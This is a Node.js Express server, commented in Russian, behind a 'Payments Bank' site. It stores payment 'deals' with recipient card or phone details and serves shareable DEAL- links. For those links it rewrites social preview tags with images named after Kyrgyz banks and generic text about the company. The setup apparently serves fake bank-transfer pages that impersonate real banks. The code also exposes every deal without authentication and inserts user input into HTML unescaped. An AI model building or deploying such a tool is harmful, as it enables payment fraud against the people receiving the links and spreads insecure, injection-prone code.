const express = require('express');
const path = require('path');
const cors = require('cors');
const { createClient } = require('@supabase/supabase-js');
const { v4: uuidv4 } = require('uuid');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 10000;

// Middleware
app.use(cors());
app.use(express.json());
const fs = require('fs');
const PUBLIC_DIR = path.join(__dirname, 'public');
console.log('__dirname:', __dirname);
console.log('PUBLIC_DIR:', PUBLIC_DIR);
console.log('public exists:', fs.existsSync(PUBLIC_DIR));
console.log('index.html exists:', fs.existsSync(path.join(PUBLIC_DIR, 'index.html')));
const STATIC_DIR = fs.existsSync(PUBLIC_DIR) ? PUBLIC_DIR : __dirname;
console.log('Using STATIC_DIR:', STATIC_DIR);
app.use(express.static(STATIC_DIR));

// Supabase клиент
if (!process.env.SUPABASE_URL || !process.env.SUPABASE_ANON_KEY) {
  console.error('❌ КРИТИЧНО: SUPABASE_URL или SUPABASE_ANON_KEY не заданы в .env!');
}

const supabase = createClient(
  process.env.SUPABASE_URL,
  process.env.SUPABASE_ANON_KEY
);

// ========== ДИАГНОСТИКА ==========
// GET /api/ping — проверить что сервер живой и Supabase подключён
app.get('/api/ping', async (req, res) => {
  try {
    const { data, error } = await supabase.from('deals').select('count').limit(1);
    if (error) {
      console.error('Supabase ping error:', error);
      return res.json({ 
        ok: false, 
        server: true, 
        supabase: false, 
        error: error.message,
        hint: error.hint || '',
        code: error.code || ''
      });
    }
    res.json({ ok: true, server: true, supabase: true });
  } catch(e) {
    res.json({ ok: false, server: true, supabase: false, error: e.message });
  }
});

// ========== API РОУТЫ ==========

// Создание сделки
app.post('/api/deal', async (req, res) => {
  try {
    const { 
      amount, 
      bank, 
      bankId,
      bankLogo,
      recipient, 
      cardNumber, 
      method, 
      country,
      currency,
      currencySymbol,
      details,
      userLogin,
      sessionId
    } = req.body;
    
    // Валидация
    if (!amount || !bank || !recipient || (!cardNumber && !details)) {
      console.warn('Validation failed:', { amount, bank, recipient, cardNumber, details });
      return res.status(400).json({ error: 'Все поля обязательны (amount, bank, recipient, cardNumber/details)' });
    }

    // Токен — берём от клиента или генерируем
    let token = req.body.token;
    if (!token || !token.startsWith('DEAL-')) {
      const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
      let p1 = '', p2 = '';
      for (let i = 0; i < 6; i++) {
        p1 += chars[Math.floor(Math.random() * chars.length)];
        p2 += chars[Math.floor(Math.random() * chars.length)];
      }
      token = `DEAL-${p1}-${p2}`;
    }

    console.log(`[CREATE] token=${token} bank=${bank} amount=${amount} user=${userLogin || sessionId || 'anon'}`);

    // Проверяем дубликат
    const { data: existing, error: existErr } = await supabase
      .from('deals')
      .select('*')
      .eq('token', token)
      .maybeSingle();
    
    if (existErr) {
      console.error('[CREATE] Error checking duplicate:', existErr);
      // Не прерываем — пробуем вставить
    }

    if (existing) {
      console.log(`[CREATE] Deal already exists: ${token}`);
      return res.json({ 
        success: true, 
        link: '/' + existing.token, 
        token: existing.token, 
        deal: existing 
      });
    }

    // Формируем объект для вставки
    const dealRecord = {
      token:            token,
      amount:           amount,
      bank:             bank,
      bank_id:          bankId || null,
      bank_logo:        bankLogo || null,
      recipient:        recipient,
      recipient_short:  recipient.split(' ')[0] + ' ' + (recipient.split(' ')[1]?.[0] || '') + '.',
      card_number:      cardNumber || null,
      details:          details || cardNumber || null,
      method:           method || 'card',
      country:          country || 'russia',
      currency:         currency || 'RUB',
      currency_symbol:  currencySymbol || '₽',
      status:           'active',
      user_login:       userLogin || null,
      session_id:       sessionId || null,
      created_at:       new Date().toISOString()
    };

    const { data, error } = await supabase
      .from('deals')
      .insert([dealRecord])
      .select();

    if (error) {
      console.error('[CREATE] Supabase insert error:', JSON.stringify(error, null, 2));
      return res.status(500).json({ 
        error: 'Ошибка базы данных: ' + error.message,
        details: error.details || '',
        hint: error.hint || '',
        code: error.code || ''
      });
    }

    if (!data || data.length === 0) {
      console.error('[CREATE] Insert returned empty data');
      return res.status(500).json({ error: 'Сделка не была сохранена (пустой ответ от БД)' });
    }

    console.log(`[CREATE] ✅ Deal saved: ${token}`);

    res.json({
      success: true,
      link: '/' + token,
      token: token,
      deal: data[0]
    });

  } catch (error) {
    console.error('[CREATE] Exception:', error);
    res.status(500).json({ error: 'Внутренняя ошибка сервера: ' + error.message });
  }
});

// Получение сделки по токену
app.get('/api/deal/:token', async (req, res) => {
  try {
    const { token } = req.params;
    const cleanToken = token.trim().toUpperCase().replace(/[^A-Z0-9-]/g, '');
    
    console.log(`[GET] token=${cleanToken}`);

    const { data, error } = await supabase
      .from('deals')
      .select('*')
      .eq('token', cleanToken)
      .maybeSingle();

    if (error) {
      console.error(`[GET] Supabase error for ${cleanToken}:`, JSON.stringify(error, null, 2));
      return res.status(500).json({ error: 'Ошибка базы данных: ' + error.message });
    }

    if (!data) {
      console.log(`[GET] Deal not found: ${cleanToken}`);
      return res.status(404).json({ error: 'Сделка не найдена' });
    }

    console.log(`[GET] ✅ Found: ${cleanToken}`);
    res.json(data);

  } catch (error) {
    console.error('[GET] Exception:', error);
    res.status(500).json({ error: 'Внутренняя ошибка сервера: ' + error.message });
  }
});

// Получение всех сделок
app.get('/api/deals', async (req, res) => {
  try {
    const { data, error } = await supabase
      .from('deals')
      .select('*')
      .order('created_at', { ascending: false })
      .limit(50);

    if (error) throw error;
    res.json(data);

  } catch (error) {
    console.error('[DEALS] Error:', error);
    res.status(500).json({ error: 'Ошибка при получении сделок' });
  }
});

// Получение сделок пользователя
app.get('/api/my-deals', async (req, res) => {
  try {
    const { sessionId, userLogin } = req.query;

    let query = supabase.from('deals').select('*').order('created_at', { ascending: false }).limit(100);

    if (userLogin) {
      query = query.eq('user_login', userLogin);
    } else if (sessionId) {
      query = query.eq('session_id', sessionId);
    } else {
      return res.json([]);
    }

    const { data, error } = await query;
    if (error) {
      console.error('[MY-DEALS] Supabase error:', JSON.stringify(error, null, 2));
      throw error;
    }
    res.json(data || []);

  } catch (error) {
    console.error('[MY-DEALS] Exception:', error);
    res.status(500).json({ error: 'Ошибка при получении сделок' });
  }
});

// Обновление статуса сделки
app.patch('/api/deal/:token', async (req, res) => {
  try {
    const { token } = req.params;
    const cleanToken = token.trim().toUpperCase().replace(/[^A-Z0-9-]/g, '');
    const { status, paymentData } = req.body;

    console.log(`[PATCH] token=${cleanToken} status=${status}`);

    const { data, error } = await supabase
      .from('deals')
      .update({ 
        status: status,
        payment_data: paymentData,
        updated_at: new Date().toISOString()
      })
      .eq('token', cleanToken)
      .select();

    if (error) {
      console.error('[PATCH] Supabase error:', JSON.stringify(error, null, 2));
      throw error;
    }

    res.json({ success: true, deal: data[0] });

  } catch (error) {
    console.error('[PATCH] Exception:', error);
    res.status(500).json({ error: 'Ошибка при обновлении сделки' });
  }
});

// Удаление сделки
app.delete('/api/deal/:token', async (req, res) => {
  try {
    const { token } = req.params;
    const cleanToken = token.trim().toUpperCase().replace(/[^A-Z0-9-]/g, '');

    const { error } = await supabase
      .from('deals')
      .delete()
      .eq('token', cleanToken);

    if (error) throw error;
    res.json({ success: true });

  } catch (error) {
    console.error('[DELETE] Exception:', error);
    res.status(500).json({ error: 'Ошибка при удалении сделки' });
  }
});

// ========== СПЕЦИАЛЬНЫЙ РОУТ ДЛЯ ССЫЛОК НА СДЕЛКИ ==========
app.get('/DEAL-:dealCode', async (req, res) => {
  const token = ('DEAL-' + req.params.dealCode).trim().toUpperCase().replace(/[^A-Z0-9-]/g, '');
  console.log(`[OG] Request for deal: ${token}`);

  const indexFromPublic = path.join(__dirname, 'public', 'index.html');
  const indexFromRoot = path.join(__dirname, 'index.html');
  const indexPath = fs.existsSync(indexFromPublic) ? indexFromPublic : indexFromRoot;
  if (!fs.existsSync(indexPath)) return res.status(404).send('index.html not found');

  let html = fs.readFileSync(indexPath, 'utf8');

  try {
    const { data: deal } = await supabase.from('deals').select('*').eq('token', token).maybeSingle();

    if (deal) {
      const currency = deal.currency_symbol || '₽';
      const amount   = Number(deal.amount).toLocaleString('ru-RU');

      // Метод перевода
      const methodLabel = deal.method === 'phone' ? 'по номеру телефона'
                        : deal.method === 'card'  ? 'по номеру карты'
                        : 'по лицевому счёту';

      // Реквизит (номер карты с пробелами или телефон)
      const rawDetails = deal.details || deal.card_number || '';
      let detailsFormatted = rawDetails;
      if (deal.method === 'card' && rawDetails) {
        const digits = rawDetails.replace(/\D/g, '');
        detailsFormatted = digits.match(/.{1,4}/g)?.join(' ') || rawDetails;
      }

      // Короткое имя получателя — Фамилия И.
      const nameParts = (deal.recipient || '').trim().split(/\s+/);
      const recipientShort = nameParts.length >= 2
        ? nameParts[0] + ' ' + nameParts[1][0] + '.'
        : deal.recipient;

      // Title — возвращаем оригинальный формат
      const title = `Пополнение ${deal.bank} ${methodLabel} на ${amount} ${currency}`;

      // Description — получатель + реквизиты + большой текст про сайт
      const desc = [
        `·Получатель: ${recipientShort}`,
        `·Реквизиты получателя: ${detailsFormatted}`,
        ``,
        ` ООО Payments Bank — Международные переводы, интернет-эквайринг и цифровые товары. Мгновенные безопасные переводы по номеру карты, телефона или лицевому счёту. Россия, Украина, Казахстан, Беларусь, Кыргызстан, Узбекистан, Таджикистан. 98% конверсия. Подключение за 1 день. Защита каждой транзакции, Пополненение баланса аккаунтов дистрибуционого магазина Steam, мнгновенные зачисления средств, кэшбэк до 3%, Техническая поддержка: 8 800 777-00-77. далее...`
      ].join('\n');

      // Превью по банку
      const previewMap = {
        'mbank':  'kyrgyzstan-mbank-preview.jpg',
        'ayil':   'kyrgyzstan-ayilbank-preview.jpg',
        'bakai':  'kyrgyzstan-bakaibank-preview.jpg',
        'optima': 'kyrgyzstan-optimabank-preview.jpg',
        'demir':  'kyrgyzstan-demirbank-preview.jpg'
      };
      const previewFile = previewMap[deal.bank_id] || 'preview.jpg';
      const imageUrl = `https://payments-bank.ru/${previewFile}`;
      const dealUrl  = `https://payments-bank.ru/${token}`;

      html = html
        .replace(/<meta property="og:title"[^>]*>/,        `<meta property="og:title" content="${title}">`)
        .replace(/<meta property="og:description"[^>]*>/,  `<meta property="og:description" content="${desc}">`)
        .replace(/<meta property="og:image"[^>]*>/,        `<meta property="og:image" content="${imageUrl}">`)
        .replace(/<meta property="og:url"[^>]*>/,          `<meta property="og:url" content="${dealUrl}">`)
        .replace(/<meta name="twitter:title"[^>]*>/,       `<meta name="twitter:title" content="${title}">`)
        .replace(/<meta name="twitter:description"[^>]*>/, `<meta name="twitter:description" content="${desc}">`)
        .replace(/<meta name="twitter:image"[^>]*>/,       `<meta name="twitter:image" content="${imageUrl}">`);

      console.log(`[OG] ✅ ${token}: ${title}`);
    } else {
      console.log(`[OG] Deal not found: ${token}`);
    }
  } catch (e) {
    console.error('[OG] Error:', e.message);
  }

  res.setHeader('Content-Type', 'text/html; charset=utf-8');
  res.send(html);
});

// ========== FALLBACK ДЛЯ SPA ==========
app.get('*', (req, res) => {
  const indexFromPublic = path.join(__dirname, 'public', 'index.html');
  const indexFromRoot = path.join(__dirname, 'index.html');
  const indexPath = fs.existsSync(indexFromPublic) ? indexFromPublic : indexFromRoot;
  if (!fs.existsSync(indexPath)) {
    return res.status(404).send('index.html not found at: ' + indexPath);
  }
  res.sendFile(indexPath);
});

app.listen(PORT, () => {
  console.log(`\n✅ Server running on port ${PORT}`);
  console.log(`Supabase URL: ${process.env.SUPABASE_URL || '❌ NOT SET'}`);
  console.log(`Supabase Key: ${process.env.SUPABASE_ANON_KEY ? '✅ SET' : '❌ NOT SET'}\n`);
});